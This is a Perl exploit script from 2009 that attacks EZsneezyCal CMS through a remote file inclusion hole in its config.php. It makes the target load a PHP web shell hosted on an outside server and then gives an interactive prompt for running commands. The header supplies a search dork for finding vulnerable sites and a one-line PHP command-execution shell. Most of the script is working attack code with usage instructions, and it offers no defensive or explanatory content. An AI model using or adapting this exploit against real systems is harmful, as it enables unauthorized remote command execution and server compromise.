#!/usr/bin/perl

#####
# [+] Author	: kaMtiEz (kamzcrew@gmail.com)
# [+] Date 	: September 30, 2009
# [+] Homepage	: http://www.indonesiancoder.com
# [+] Vendor 	: http://www.jdtmmsm.com/
# [+] Download 	: http://www.jdtmmsm.com/downloads/index.php?expA=1
# [+] version 	: v95.1 - 95.2
# [+] Method	: Remote File Inclusion 
# [+] Dork 	: "Kill-9"+"IndonesianCoder"
# [+] Location 	: INDONESIA
# [~] Notes	:
# makasih buad babe and enyak ma ade .... muach ..
# sayang jangan marah dong .. maaf kemarin bangun jam 8 malem .. :(
# buat vycOd kuliah coy ojo fbnan wae ! wkwkwkwk
# pagi jam 10 ditemani don tukulesto .. dan setelah mencoba akhirnya dapet vuln .. zzzzzzzzzzzzzzzzz
# Aura Kasih : Apakah harus kaMtiEz, atau Don Tukulesto yang aku pilih ?
# [~] Usage	:
# perl kaMz.pl <target> <weapon url> <cmd>
# perl kaMz.pl http://127.0.0.1/path/ http://www.indonesiancoder.org/shell.txt cmd
# Weapon example: <?php system($_GET['cmd']); ?>
#####
use HTTP::Request;
use LWP::UserAgent;
$Tux = $ARGV[0];
$Pathloader = $ARGV[1];
$oliv = $ARGV[2];
if($Tux!~/http:\/\// || $Pathloader!~/http:\/\// || !$oliv){usage()}
head();
sub head()
 {
 print "[X]============================================================================[X]\r\n";
 print " |			EZsneezyCal CMS Remote File Inclusion			|\r\n";
 print "[X]============================================================================[X]\r\n";
 }
while()
{
      print "[w00t] \$";
while(<STDIN>)
      {
              $kamz=$_;
              chomp($kamz);
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Tux.'config/config.php?cfg[rootPath]='.$Pathloader.'?&'.$oliv.'='.$kamz)or die "\nCould Not connect\n";
$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[�]/;
if (!$kamz) {print "\nPlease Enter a Command\n\n"; $return ="";}
elsif ($return =~/failed to open stream: HTTP request denied!/ || $return =~/: Cannot execute a blank command in /)
      {print "\nCann't Connect to cmd Host or Invalid Command\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}
if($return =~ /(.*)/)
{
      $finreturn = $1;
      $finreturn=~ tr/[�]/[\n]/;
      print "\r\n$finreturn\n\r";
      last;
}
else {print "[w00t] \$";}}}last;
sub usage()
 {
 head();
 print " | Usage: perl kaMz.pl <target> <weapon url> <cmd>                              |\r\n";
 print " | <Site> - Full path to execute ex: http://127.0.0.1/path/                     |\r\n";
 print " | <Weapon url> - Path to Shell e.g http://www.indonesiancoder.org/shell.txt    |\r\n";
 print " | <cmd> - Command variable used in php shell                                   |\r\n";
 print "[X]============================================================================[X]\r\n";
 print " | 	IndonesianCoder Team	| KILL-9 CREW | KIRIK CREW | AntiSecurity.org   |\r\n";
 print " |   tukulesto, M3NW5, arianom, tiw0L, Pathloader, abah_benu, VycOd, Gh4mb4S    |\r\n";
 print " |  Jack-, Contrex, onthel, yasea, bugs, olivia, Jovan, Aar, Ardy, invent, Ronz |\r\n";
 print " |    Coracore, black666girl, NepT, ichal, tengik, och3_an3h, rendy and YOU!!   |\r\n";
 print "[X]============================================================================[X]\r\n";
 print " |	http://www.IndonesianCoder.org	   |	http://www.AntiSecRadio.fm 	|\r\n";
 print "[X]============================================================================[X]\r\n";
 exit();
 }